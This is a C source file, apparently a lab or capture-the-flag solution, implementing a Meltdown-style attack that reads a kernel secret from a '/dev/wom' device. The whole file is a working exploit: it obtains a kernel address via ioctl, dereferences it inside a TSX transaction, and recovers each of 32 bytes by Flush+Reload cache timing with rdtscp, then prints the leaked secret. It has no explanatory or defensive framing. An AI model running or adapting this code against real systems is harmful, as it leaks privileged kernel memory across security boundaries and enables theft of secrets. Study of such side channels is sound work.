#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <inttypes.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <x86intrin.h>
#include <time.h>
#include <assert.h>

#include "asm.h"

#define SECRET_LENGTH 32
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)

static uint8_t probe_array[256 * 4096];
static volatile uint8_t dummy;

int main() {
    int fd = open("/dev/wom", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    unsigned long secret_addr = 0;
    if (ioctl(fd, WOM_GET_ADDRESS, &secret_addr) < 0) { perror("ioctl"); return 1; }

    for (int i = 0; i < 256; ++i) probe_array[i * 4096] = 1;

    char warm[SECRET_LENGTH];
    lseek(fd, 0, SEEK_SET);
    size_t r = read(fd, warm, SECRET_LENGTH);
    (void)r;

    char leaked[33] = {0};
    for (int offset = 0; offset < 32; ++offset) {
        for (int i = 0; i < 256; ++i) clflush(&probe_array[i * 4096]);
        lfence(); cpuid();

        if (_xbegin() == _XBEGIN_STARTED) {
            uint8_t value = *(volatile uint8_t *)(secret_addr + offset);
            dummy = probe_array[value * 4096];
            _xend();
        }

        int best_index = -1;
        uint64_t best_time = (uint64_t)-1;
        for (int i = 0; i < 256; ++i) {
            int mix_i = (i + 109883 * 256) & 255;
            uint8_t *addr = &probe_array[mix_i * 4096];
            lfence();
            cpuid();
            uint64_t start = rdtscp();
            (void)*addr;
            uint64_t end = rdtscp();
            cpuid();
            uint64_t dt = end - start;
            if (dt < best_time) { best_time = dt; best_index = mix_i; }
        }
        leaked[offset] = (char)best_index;
    }

    printf("Secret: %s\n", leaked);
    close(fd);
    return 0;
}